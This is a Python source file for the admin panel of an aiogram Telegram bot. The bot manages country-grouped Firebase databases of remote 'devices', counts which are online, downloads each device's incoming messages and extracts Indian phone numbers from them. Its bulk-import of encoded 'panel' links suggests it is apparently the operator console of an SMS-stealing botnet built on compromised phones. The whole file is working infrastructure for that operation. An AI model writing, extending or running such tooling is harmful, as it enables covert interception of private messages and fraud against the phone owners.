from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
import time
import database as db
import firebase_utils as fbu
from utils.ui import sc, btn
from utils.helper import is_admin, get_countries, get_servers_grouped
from states import S

admin_router = Router()

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("enter as user", "user:home", "👤"), btn("analytics", "admin:analytics", "📊")],
        [btn("manage servers", "admin:manage_fb", "🔥"), btn("manage bots", "admin:bots", "🤖")],
        [btn("manage admins", "admin:admins", "🛡"), btn("broadcast", "admin:broadcast", "📢")],
        [btn("view users", "admin:users", "👥"), btn("refresh panel", "admin:home", "🔄")]
    ])

@admin_router.message(F.text == "/admin")
async def admin_panel_cmd(msg: Message):
    if not is_admin(msg.from_user.id): return
    d = db.load_data()
    await msg.answer(f"👑 <b>{sc('admin dashboard')}</b>\nUsers: {len(d.get('users', {}))}\nBases: {len(d.get('firebases', []))}", reply_markup=admin_kb(), parse_mode="HTML")

@admin_router.callback_query(F.data == "admin:home")
async def admin_home(cq: CallbackQuery):
    if not is_admin(cq.from_user.id): return await cq.answer("🚫")
    d = db.load_data()
    try: await cq.message.edit_text(f"👑 <b>{sc('admin dashboard')}</b>\nUsers: {len(d.get('users', {}))}\nBases: {len(d.get('firebases', []))}", reply_markup=admin_kb(), parse_mode="HTML")
    except: pass

@admin_router.callback_query(F.data == "admin:manage_fb")
async def admin_manage_fb(cq: CallbackQuery):
    if not is_admin(cq.from_user.id): return await cq.answer("🚫")
    d = db.load_data()
    countries = get_countries(d)
    kb = [[btn(c, f"admin:country:{c}", "🌍")] for c in countries]
    kb.append([btn("add bulk urls", "admin:add_bulk", "➕")])
    kb.append([btn("back", "admin:home", "🔙")])
    await cq.message.edit_text(f"🔥 <b>{sc('manage servers')}</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@admin_router.callback_query(F.data.startswith("admin:country:"))
async def admin_country(cq: CallbackQuery):
    country = cq.data.split(":")[2]
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    kb = []
    for i, srv in enumerate(servers):
        kb.append([btn(f"server {i+1} ({len(srv)} bases)", f"admin:server:{country}:{i}", "📁")])
    kb.append([btn("back", "admin:manage_fb", "🔙")])
    await cq.message.edit_text(f"🌍 {country} - Servers:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@admin_router.callback_query(F.data.startswith("admin:server:"))
async def admin_server(cq: CallbackQuery):
    parts = cq.data.split(":")
    country, idx = parts[2], int(parts[3])
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    srv = servers[idx]
    try: await cq.message.edit_text("🔄 Fetching online counts...")
    except: pass
    
    kb = []
    for i, fb in enumerate(srv):
        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        online = sum(1 for c in clients.values() if isinstance(c, dict) and c.get("status")) if clients else 0
        total = len(clients) if clients else 0
        kb.append([btn(f"base {i+1} ({online} ON / {total} Total)", f"admin:base:{country}:{idx}:{i}", "🗂")])
        
    kb.append([btn("remove base", f"admin:rmmenu:{country}:{idx}", "🗑")])
    kb.append([btn("back", f"admin:country:{country}", "🔙")])
    await cq.message.edit_text(f"📁 Server {idx+1} Bases:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@admin_router.callback_query(F.data.startswith("admin:base:"))
async def admin_base(cq: CallbackQuery):
    parts = cq.data.split(":")
    country, srv_idx, base_idx = parts[2], int(parts[3]), int(parts[4])
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    fb = servers[srv_idx][base_idx]
    try: await cq.message.edit_text("🔄 Fetching devices...")
    except: pass
    
    clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
    kb = []
    if clients:
        for dev_id, c in clients.items():
            if isinstance(c, dict) and c.get("status") is True: # ONLY ONLINE
                kb.append([btn(f"device {dev_id[:10]}", f"admin:dev:{country}:{srv_idx}:{base_idx}:{dev_id}", "📱")])
                
    kb.append([btn("back", f"admin:server:{country}:{srv_idx}", "🔙")])
    if not kb: return await cq.answer("No online devices.")
    await cq.message.edit_text(f"Base {base_idx+1} - Only Online Devices:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@admin_router.callback_query(F.data.startswith("admin:dev:"))
async def admin_device(cq: CallbackQuery):
    parts = cq.data.split(":")
    country, srv_idx, base_idx, dev_id = parts[2], int(parts[3]), int(parts[4]), parts[5]
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    fb = servers[srv_idx][base_idx]
    try: await cq.message.edit_text("🔄 Fetching numbers...")
    except: pass
    
    msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=1000", fb.get("auth"))
    msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
    best_nums = fbu.extract_best_numbers({}, msgs)
    
    text = f"📱 <b>Device Info</b>\n🆔 {dev_id}\n🔗 {fb['url']}\n\n<b>Numbers:</b>\n"
    if not best_nums: text += "No numbers found."
    for n, c in best_nums: text += f"📞 +91{n} (Conf: {c}%)\n"
        
    d.setdefault("device_numbers", {})[dev_id] = {"numbers": [n for n,c in best_nums], "base": f"Base {base_idx+1}", "srv": f"Server {srv_idx+1}"}
    db.save_data(d)
    
    kb = [[btn("back", f"admin:base:{country}:{srv_idx}:{base_idx}", "🔙")]]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@admin_router.callback_query(F.data.startswith("admin:rmmenu:"))
async def admin_rmmenu(cq: CallbackQuery):
    parts = cq.data.split(":")
    country, srv_idx = parts[2], int(parts[3])
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    srv = servers[srv_idx]
    kb = [[btn(f"delete base {i+1}", f"admin:rmdo:{country}:{srv_idx}:{i}", "🗑")] for i in range(len(srv))]
    kb.append([btn("cancel", f"admin:server:{country}:{srv_idx}", "❌")])
    await cq.message.edit_text("Select Base to delete:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))

@admin_router.callback_query(F.data.startswith("admin:rmdo:"))
async def admin_rmdo(cq: CallbackQuery):
    parts = cq.data.split(":")
    country, srv_idx, base_idx = parts[2], int(parts[3]), int(parts[4])
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    fb_to_rm = servers[srv_idx][base_idx]
    d["firebases"] = [f for f in d["firebases"] if f["url"] != fb_to_rm["url"]]
    curr = 1
    for f in d["firebases"]:
        if f.get("country") == country:
            f["label"] = f"Base {curr}"
            curr += 1
    db.save_data(d)
    await cq.answer("✅ Removed & Auto-arranged!")
    await admin_manage_fb(cq)

@admin_router.callback_query(F.data == "admin:add_bulk")
async def admin_bulk_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id): return
    await state.set_state(S.add_bulk_urls)
    await cq.message.edit_text("Send URLs one per line (Panel link or Firebase URL):", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("cancel", "admin:manage_fb", "❌")]]), parse_mode="HTML")

@admin_router.message(S.add_bulk_urls)
async def admin_bulk_done(msg: Message, state: FSMContext):
    await state.clear()
    d = db.load_data()
    added = 0
    country = "India"
    for line in msg.text.strip().split("\n"):
        url = line.strip()
        if not url: continue
        if "#DARKs=" in url or "?s=" in url:
            dec = fbu.decode_panel_url(url)
            if dec: url = dec[0]
        if url.startswith("http"):
            d["firebases"].append({"url": url, "label": "Base ?", "country": country, "auth": ""})
            added += 1
            
    curr = 1
    for f in d["firebases"]:
        if f.get("country") == country:
            f["label"] = f"Base {curr}"
            curr += 1
    db.save_data(d)
    await msg.answer(f"✅ {added} Bases added!", reply_markup=admin_kb())
